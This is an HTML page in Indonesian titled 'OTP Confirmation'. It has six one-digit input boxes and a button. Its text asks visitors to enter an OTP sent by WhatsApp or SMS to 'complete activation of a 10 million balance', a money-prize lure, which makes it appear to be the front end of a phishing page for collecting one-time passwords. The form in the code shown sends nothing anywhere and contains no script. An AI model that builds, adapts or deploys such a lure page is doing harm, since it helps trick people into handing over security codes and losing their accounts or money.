<html lang="en">
 <head>
  <meta charset="utf-8"/>
  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
  <title>
   OTP Confirmation
  </title>
  <script src="https://cdn.tailwindcss.com">
  </script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&amp;display=swap" rel="stylesheet"/>
  <style>
   body {
            font-family: 'Roboto', sans-serif;
        }
  </style>
 </head>
 <body class="bg-gray-100 flex items-center justify-center min-h-screen">
  <div class="bg-white p-8 rounded-lg shadow-lg w-full max-w-md">
   <div class="flex justify-center mb-6">
   </div>
   <h2 class="text-2xl font-bold text-center mb-4">
    Konfirmasi Kode OTP
   </h2>
   <p class="text-gray-600 text-center mb-6">
    Masukkan kode OTP yang telah kami kirimkan di wa atau sms nomor telepon Anda untuk menyelesaikan aktivasi saldo 10juta.
   </p>
   <form>
    <div class="grid grid-cols-6 gap-2 mb-6">
     <input class="w-full h-12 text-center border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" maxlength="1" type="text"/>
     <input class="w-full h-12 text-center border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" maxlength="1" type="text"/>
     <input class="w-full h-12 text-center border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" maxlength="1" type="text"/>
     <input class="w-full h-12 text-center border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" maxlength="1" type="text"/>
     <input class="w-full h-12 text-center border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" maxlength="1" type="text"/>
     <input class="w-full h-12 text-center border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500" maxlength="1" type="text"/>
    </div>
    <button class="w-full bg-blue-500 text-white py-3 rounded-lg font-semibold hover:bg-blue-600 transition duration-300" type="submit">
     Konfirmasi
    </button>
   </form>
   <p class="text-gray-600 text-center mt-6">
    Tidak menerima kode?
    <a class="text-blue-500 hover:underline" href="#">
     Kirim ulang
    </a>
   </p>
  </div>
 </body>
</html>
